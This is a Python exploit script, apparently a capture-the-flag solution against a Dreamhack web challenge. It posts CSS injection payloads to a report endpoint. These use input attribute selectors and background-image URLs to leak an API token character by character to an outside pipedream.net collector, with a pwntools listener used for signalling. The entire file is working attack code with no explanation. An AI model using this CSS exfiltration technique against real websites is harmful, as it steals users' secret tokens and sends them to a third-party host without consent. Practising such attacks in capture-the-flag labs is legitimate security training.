from pwn import *
import requests
from threading import Thread
import string
import urllib.parse

is_found = False
is_stop = False

def wait_thd():
    global is_found

    while True:
        if is_found: continue
        if is_stop: break
        nc = listen(12121)
        nc.wait_for_connection()
        is_found = True
        nc.close()

def main():
    global is_found
    global is_stop
    api_key = ''
    url = 'http://host3.dreamhack.games:8409/report?color=yellow'
    go = Thread(target=wait_thd, args=())
    go.start()

    for i in range(16):
        for c in string.ascii_lowercase:
            pay = '/mypage?color=yellow}input%23InputApitoken[value^='
            pay += api_key + c
            pay += ']{background: url(https://eowzrc62lbjfs7c.m.pipedream.net/'+api_key + c+')'
            data = {'path':pay}
            resp = requests.post(url, data=data)
            #__import__('time').sleep(0.050)
            if is_found:
                api_key += c
                log.info('FOUND: %s'%api_key)
                break
            print(c)
            print(pay)
    is_stop = True
    go.join()
    print(api_key)

if __name__ == '__main__':
    main()